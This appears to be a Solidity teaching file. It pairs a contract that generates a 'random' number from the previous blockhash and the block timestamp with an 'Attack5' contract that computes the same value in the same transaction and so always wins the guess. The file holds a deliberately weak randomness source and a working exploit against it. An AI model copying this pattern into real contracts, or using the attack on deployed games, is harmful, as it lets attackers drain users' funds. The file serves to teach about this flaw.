// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "hardhat/console.sol";

contract Random {

    function guessTheRandomNo(uint guess) public view returns(bool){
        uint random = uint(keccak256(abi.encodePacked(blockhash(block.number-1), block.timestamp)));
        console.log("Generated Random no - ", random);
        return random == guess;
    }
}

contract Attack5 {
    Random random; 

    function attack(Random _random) public {
        random = Random(_random);
        uint guess = uint(keccak256(abi.encodePacked(blockhash(block.number-1), block.timestamp)));
        console.log("Guessed Random no - ", guess);
        require(random.guessTheRandomNo(guess) == true, "Attack Failed");
    }
}